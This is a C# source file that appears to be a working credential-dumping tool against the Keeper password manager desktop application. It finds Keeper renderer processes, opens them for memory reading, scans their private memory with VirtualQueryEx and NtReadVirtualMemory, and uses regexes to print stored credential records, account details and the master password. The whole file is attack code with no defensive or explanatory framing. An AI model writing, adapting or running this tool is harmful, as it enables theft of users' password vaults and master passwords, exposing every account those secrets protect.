using System;
using System.Management;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;

static class Program
{
    public static string GetCommandLine(this Process process)
    {
        if (process is null || process.Id < 1)
        {
            return "";
        }
        string query = $@"SELECT CommandLine FROM Win32_Process WHERE ProcessId = {process.Id}";
        using (var searcher = new ManagementObjectSearcher(query))
        using (var collection = searcher.Get())
        {
            var managementObject = collection.OfType<ManagementObject>().FirstOrDefault();
            return managementObject != null ? (string)managementObject["CommandLine"] : "";
        }
    }

    public static void extract_credentials(string text)
    {
        int index = text.IndexOf("{\"title\":\"");
        int eindex = text.IndexOf("}");
        while (index >= 0)
        {
            try
            {
                int endIndex = Math.Min(index + eindex, text.Length);
                Regex reg = new Regex("(\\{[ -~]+[custom\\\"[ -~]\\}|notes\\\"[ -~]\\}])");
                string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();
                if ((match.Length > 2) && (!stringsList.Contains(match)))
                {
                    Console.WriteLine("->Credential Record Found : " + match + "\n");
                    stringsList.Add(match);
                }
                index = text.IndexOf("{\"title\":\"", index + 1);
                eindex = text.IndexOf("}", eindex + 1);
            }
            catch
            {
                return;
            }

        }
    }

    public static void extract_account(string text)
    {
        int index = text.IndexOf("{\"expiry\"");
        int eindex = text.IndexOf("}");
        while (index >= 0)
        {
            try
            {
                int endIndex = Math.Min(index + eindex, text.Length);
                Regex reg = new Regex("(\\{\\\"expiry\\\"[ -~]+@[ -~]+(?=\\}).)");
                string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();
                if ((match.Length > 2))
                {
                    Console.WriteLine("->Account Record Found : " + match + "\n");
                    return;
                }
                index = text.IndexOf("{\"expiry\"", index + 1);
                eindex = text.IndexOf("}", eindex + 1);
            }
            catch
            {
                return;
            }
        }

    }

    public static void extract_master(string text)
    {
        int index = text.IndexOf("data_key");
        int eindex = index + 64;
        while (index >= 0)
        {
            try
            {
                int endIndex = Math.Min(index + eindex, text.Length);
                Regex reg = new Regex("(data_key[ -~]+)");
                var match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString();
                if (match.Replace("data_key", "").Length > 5)
                {
                    Console.WriteLine("->Master Password : " + match.Replace("data_key", "") + "\n");
                }
                index = text.IndexOf("data_key", index + 1);
                eindex = index + 64;
            }
            catch
            {
                return;
            }

        }
    }

    public static List<string> stringsList = new List<string>();
    static void Main(string[] args)
    {
        foreach (var process in Process.GetProcessesByName("keeperpasswordmanager"))
        {
            string commandline = GetCommandLine(process);
            if (commandline.Contains("--renderer-client-id=5") || commandline.Contains("--renderer-client-id=7"))
            {
                Console.WriteLine("->Keeper Target PID Found: {0}", process.Id.ToString());
                Console.WriteLine("->Searching...\n");
                IntPtr processHandle = OpenProcess(0x00000400|0x00000010, false, process.Id);
                IntPtr address = new IntPtr(0x10000000000);
                MEMORY_BASIC_INFORMATION memInfo = new MEMORY_BASIC_INFORMATION();
                while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf(memInfo)) != 0)
                {
                    if (memInfo.State == 0x00001000 && memInfo.Type == 0x20000)
                    {
                        byte[] buffer = new byte[(int)memInfo.RegionSize];
                        if (NtReadVirtualMemory(processHandle, memInfo.BaseAddress, buffer, (uint)memInfo.RegionSize, IntPtr.Zero) == 0x0)
                        {
                            string text = Encoding.ASCII.GetString(buffer);
                            extract_credentials(text);
                            extract_master(text);
                            extract_account(text);
                        }
                    }

                    address = new IntPtr(memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64());
                }

                CloseHandle(processHandle);

            }

        }

    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll")]
    public static extern uint NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToRead, IntPtr NumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }
}